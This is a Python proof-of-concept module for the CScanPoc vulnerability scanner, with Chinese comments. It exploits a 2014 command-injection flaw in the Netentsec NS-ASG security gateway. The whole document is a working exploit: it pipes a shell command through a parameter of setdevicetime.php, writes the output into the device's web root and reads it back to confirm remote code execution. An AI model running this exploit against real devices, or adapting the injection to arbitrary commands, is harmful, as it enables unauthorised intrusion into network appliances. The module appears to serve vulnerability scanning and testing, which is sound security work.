# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Netentsec_0014'  # 平台漏洞编号，留空
    name = '网康NS-ASG 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关命令执行漏洞：
        /protocol/devicestatus/setdevicetime.php
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=058987'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6ce0a44c-3915-415a-a85a-cac5130f6240'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-058987
            hh = hackhttp.hackhttp()
            arg = self.target
            # 有限制的命令执行（不能有空格,,,）
            url = arg + \
                '/protocol/devicestatus/setdevicetime.php?procotalarray[messagecontent]=a|ifconfig>/Isc/third-party/httpd/htdocs/test.txt%20b'
            code, head, res, err, _ = hh.http(url)
            if code == 200:
                code, head, res, err, _ = hh.http(arg + '/test.txt')
                if (code == 200) and ('Link encap' in res):
                    #security_hole('Command Execution: ' + url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
